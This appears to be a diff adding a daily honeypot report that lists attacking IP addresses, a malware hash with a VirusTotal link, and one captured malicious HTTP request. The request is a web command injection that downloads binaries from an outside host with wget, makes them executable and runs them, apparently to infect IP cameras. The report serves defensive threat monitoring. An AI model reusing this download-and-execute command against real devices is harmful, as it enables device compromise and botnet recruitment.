@@ -1,0 +1,22 @@
+Top 5 IPs for 2023-11-28:
+172.173.215.165
+104.152.52.216
+165.232.46.80
+222.186.16.210
+222.186.16.212
+
+Top malware seen: 
+
+56e376fe961db08c622c70a25200a89bec93290bba54f33f9577e3721e05323b
+https://www.virustotal.com/gui/file/56e376fe961db08c622c70a25200a89bec93290bba54f33f9577e3721e05323b
+
+Malicious commands seen:
+
+GET /shell?cd+/tmp;rm+imaginebeingarm+imaginebeingarm7;wget+http:/\/faper.ddns.net/imaginebeingarm7;chmod+777+imaginebeingarm7;./imaginebeingarm7+MONITOR.ipcams;wget+http:/\/faper.ddns.net/imaginebeingarm;chmod+777+imaginebeingarm;./imaginebeingarm+MONITOR.ipcams HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
